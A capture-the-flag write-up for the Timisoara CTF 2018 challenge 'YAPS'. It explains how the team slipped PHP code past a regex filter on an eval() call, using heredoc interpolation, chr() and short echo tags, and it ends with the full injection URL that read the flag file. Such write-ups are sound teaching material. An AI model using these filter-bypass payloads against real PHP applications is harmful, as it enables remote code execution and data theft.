---
title: YAPS
contest: Timisoara CTF Finals 2018
authors: trupples
layout: writeup
---

This was one of the most engaging challenges and our team had a lot of fun
working together towards the solution.

```php
 <?php

$k = $_REQUEST['k'];
// just one simple trick.. now all hackers hate him
if (preg_match("/[\w]{3,}/is", $k) || preg_match("/\.|\"|'|\[/s", $k) || strlen($k) > 100) die('nope');

eval($k);

highlight_file(__FILE__);
```

It consists of a PHP file which eval()'s a GET parameter if it passes some
checks, namely it must be shorter than 100 characters, it can not contain any
`.`, `'`, `"` or `[` characters, and it can't have more than two consecutive
letter or underscore combinations. We approached these restrictions from quite
a different perspective than the one presented in the author's writeup [[1]] so
be sure to check it out as well.

## Strings longer than 2 word characters

One thing we really needed to figure out was being able to construct strings
with more than 2 word characters. We tried some methods of appending small 2
character strings and eventually settled on heredoc variable interpolation.

In PHP there are a bunch of ways of writing out strings. The simplest is just
writing some word characters not enclosed by anything and not separated by any
non-word characters:

```php
$a = mystring;
var_dump($a); # => string(8) "mystring"
```

Two other string syntaxes are single and double quoted strings but we can not
use those because the check would fail. The last and most useful one for this
task is the heredoc [[2]] syntax. It has its drawbacks such as more "wasted"
characters and the inability to inline it as it is only available for
`$var = string;` statements. The syntax is as follows:

```php
$b = <<<DELIMITER
string
can be
multiline
DELIMITER;
var_dump($b);	# => string(23) "string
				# can be
				# multiline"
```

The conditions for this to work are that the two delimiters must be the same
and that there must be a newline after the first delimiter and immediately
before the second.

One useful feature of double quote and heredoc strings is variable
interpolation. This means that variable names inside strings will be replaced
with the variable's contents. For example:

```php
$a = "Hello,";
$b = "World!";
$greeting = <<<TRUPPLES
$a $b
TRUPPLES;
echo $greeting;	# => Hello, World!
```

We used this to create strings longer than the 2 character limit like so:

```php
$a=re;
$b=ad;
$c=fi;
$d=le;
$e=<<<Z
$a$b$c$d
Z;
echo $e;	# => readfile
```

This can be further optimised by inlining the `$a` part, thus saving 4
characters:

```php
$b=ad;
$c=fi;
$d=le;
$e=<<<Z
re$b$c$d
Z;
echo $e;
```

## No `.` characters

For our first payload we tried embedding the flag filename and readfile
function name in the payload itself. This proved difficult as `flag.php`
contains a `.` character which is forbidden. Later on we changed the payload to
a much simpler and more flexible one.

To be able to use a `.` character we used the `chr()` function, but because its
name is longer than 2 characters we needed to build its name like in the
snippet from before.

```php
$a=hr;
$b=<<<Z
c$a
Z;
$c=$b(46);
echo $b;	# => chr
echo $c;	# => .
```

To build the flag filename we did the following:
```php
$a=hr;
$c=<<<Z
c$a
Z;	# chr

$a=ag;
$b=hp;
$B=<<<Z
fl$a{$c(46)}p$b
Z;
# fl$a{$c(46)}p$b
# ||||   |    |||
# flag   .    php
```

## Function choice

Initially we tried using `file_get_contents`, `readfile` and some others but
couldn't get under the 100 char limit. Using the `file` funtion we were able to
do so and read the flag file line by line. It is comparatively way shorter and
this is very helpful, especially for this task where every byte mattered.

One trick we needed to use is using curly brackets instead of square brackets
for indexing the returned line array:

```php
file("flag.php"){2}	# works
file("flag.php")[2]	# gets matched by regex - would have worked the same
```

## Getting back the results

Now we're able to read the flag file but there's a slight problem. `readfile`
sends the file contents to the output buffer, which is most convenient, whereas
`file` returns them.

The first option to think of is `echo`-ing the return value but it cannot be
used as it's 4 characters long. Another variant would be creating a string
like we did with `chr` with the name of the `var_dump` or `print_r` functions,
but that got over the 100 character limit.

What worked out well was using an `<?= expression ?>` short echo tag which
evaluates the given expression and then `echo`-es the result. For example:

```php
<?php
$A = "file_get_contents";
$B = "http://example.com/";
?>
<?= $A($B) ?>	# => echoes the contents of the example.com index page
```

## The first payload

To put it all together, out first payload looked like:

```php
# $c = 'chr'
$a=hr;
$c=<<<Z
c$a
Z;

# $A = 'file'
$b=le;$A=<<<Z
fi$b
Z;

# $B = 'flag.php'
$a=ag;$b=hp;$B=<<<Z
fl$a{$c(46)}p$b
Z;
?>

# Print file("flag.php")[2]
<?=$A($B){2}?>
```

Or in URL form:

`http://89.38.210.129:8095/?k=$a=hr;$c=<<<Z%0Ac$a%0AZ;%0a$b=le;$A=<<<Z%0afi$b%0aZ;%0a$a=ag;$b=hp;$B=<<<Z%0afl$a{$c(46)}p$b%0aZ;%0a?><?=$A($B){2}?>`

Accessing this URL got the flag:
```
// timctf{not_so_much_intended___new_flag_for_you}
```

[1]: https://github.com/DarkyAngel/My-CTF-Challenges
[2]: https://secure.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc
